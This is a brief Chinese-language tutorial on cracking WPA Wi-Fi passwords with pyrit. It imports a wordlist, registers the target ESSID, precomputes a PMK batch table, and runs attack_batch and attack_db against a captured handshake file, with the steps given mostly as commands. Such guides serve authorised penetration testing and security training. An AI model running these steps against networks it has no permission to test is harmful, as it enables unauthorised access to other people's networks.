# WPA渗透-pyrit：batch-table加速attack_db模块加速_“attack_db”模块加速

## 1.渗透WIFI

1.导入密码字典

```
pyrit -i 字典文件 import_passwords
-i：输入的文件名
import_passwords：从类文件源导入密码。

pyrit -i /root/wifi/pwd.txt import_passwords
```

2.导入essid，破解完成记得删除

```
pyrit -e wifi名称 create_essid
-e：按ESSID过滤AccessPoint
create_essid：创建一个新的ESSID
delete_essid：从数据库中删除一个ESSID

pyrit -e cisco-1809 create_essid
```

![image.png](https://img.gyxnb.top/img/290bdf72849448e69d448042809d99f1.png)

3.批处理数据库,速度比较慢，耐心等待

```
pyrit batch 
batch：批处理数据库
```

![image.png](https://img.gyxnb.top/img/a3a6aeea675d496a9c14dc1a68b3cb3c.png)

4.batch-table(批处理数据库)加速渗透wifi

```
pyrit -e WiFi名称 -r cap包 attack_batch
attack_batch：攻击从数据库的PMKs/密码握手
-r：pcap格式的数据包捕获源

pyrit -e cisco-1809 -r wpa-1-01.cap attack_batch
```

![image.png](https://img.gyxnb.top/img/d7deff080cfa46d3a7b77106d1949108.png)

5.attack_db 加速渗透wifi

```
pyrit -e WiFi名称 -r cap包 attack_db
attack_db：攻击与数据库中的PMK握手
-r：pcap格式的数据包捕获源

pyrit -e cisco-1809 -r wpa-1-01.cap attack_db
```

![image.png](https://img.gyxnb.top/img/7327ae375337438abb00e7aa60142233.png)

6.batch-table和hash-table对比

相同点：生成起来都很慢

不同点：hash-table可以分享给别人用，batch-table只能自己用

弊端：需要生成batch-table 字典越大生成越慢

优势：生成batch-table后，渗透速度指数级提升